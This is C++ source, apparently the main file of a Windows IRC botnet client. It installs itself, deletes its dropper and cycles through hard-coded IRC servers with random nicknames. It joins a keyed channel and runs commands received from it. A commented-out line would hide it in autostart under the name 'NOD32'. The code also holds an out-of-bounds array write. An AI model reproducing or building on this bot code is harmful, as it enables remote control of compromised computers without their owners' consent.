#include "Network.h"
#include "Irc.h"
#include "Security.h"
#include "Config.h"
#include "Includes.h"

// objects
Net NET;
Irc IRC;
Sec SEC;

// variab
int Cerr;
SOCKET ss;
WSADATA wsaData;
struct sockaddr_in addr;
int stej_serv = 0;
char *RText, *IRC_REG;
int quit = 0;

char color[] = "\x002\x003";
char *name, *chan, *ident;
char *nick1, *nick2, *nick3;

int *serv_num;
char **server;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	/*    some initialization what we need     */
	serv_num = new int(6);
	server   = new char*[*serv_num];

	server[0] = SERVER1;
	server[1] = SERVER2;
	server[2] = SERVER3;
	server[3] = SERVER4;
	server[4] = SERVER5;
	server[5] = SERVER6;
	server[6] = SERVER7;

	name = new char[255];
	chan = new char[255];
	memset(name, '\0', 255);
	memset(chan, '\0', 255);

	sprintf(name, "%s4,1 %s", color, FULL_NAME);
    sprintf(chan, "JOIN %s %s\n", CHANNEL, CKEY);

	ident = IRC.GetRandomNick("", 0);

	//////////////////////////////////////////////
	//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//
	
	while(1)
	{
		char *file_name;
		char *full_name;
		char *irc_full_name;
		char *first_run;

		file_name = SEC.GetFileName();
		full_name = SEC.GetFilePath(file_name);
		first_run = SEC.GetFilePath(SEC.IRC_FILE);

		//WS.AddApp("NOD32", full_name, HKEY_LOCAL_MACHINE);


		irc_full_name = SEC.BotInstall();

		if(strcmp(full_name, irc_full_name) == 0)
			break;
		if(strcmp(full_name, first_run) == 0)
			break;
	}

	SEC.CheckFileRunning(EXEC_FILE, 2);
	remove(EXEC_FILE);

	while(quit != 9996999)
	{
		while(quit != 9996999)
		{
			// inicializacija neta
			WSAStartup(0x202, &wsaData);
			ss = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
			if(ss == SOCKET_ERROR)
			{
				system("pause");
				exit(1);
			}
			
			NET.SetAddrStructure(ss, addr, 6667, server[stej_serv]); //213.161.11.78
			printf("Connecting to: %s\n", server[stej_serv]);
			// connect to server
			if(Cerr = NET.Connect() == -1)
			{
				if(stej_serv > 6)
				{
					NET.QuitConnection();
					stej_serv = 0;
					Sleep(10000);
					break;
				}
				else
				{
					NET.QuitConnection();
					stej_serv++;
					Sleep(5000);
					break;
				}
			}
			
			nick1 = IRC.GetRandomNick(NiCK1, 1);
			nick2 = IRC.GetRandomNick(NiCK2, 1);
			nick3 = IRC.GetRandomNick(NiCK3, 1);
			
			// IRC registracija
			IRC.IrcRegistration(ss, name, EMAIL, ident, server[stej_serv], nick1, nick2, nick3);
			
			NET.Send(chan, ss);
			
			while(quit != 9996999)
			{
				RText = NET.Recv(ss);
				
				if(strcmp(RText, "666") == 0)
				{
					if(stej_serv > 6)
					{
						NET.QuitConnection();
						stej_serv = 0;
						Sleep(10000);
						break;
					}
					else
					{
						NET.QuitConnection();
						stej_serv++;
						Sleep(5000);
						break;
					}
				}
				else
				{
					quit = IRC.IrcCommands(ss, RText);
				}
			}
		}
	}
	
	NET.QuitConnection();
	return 0;
}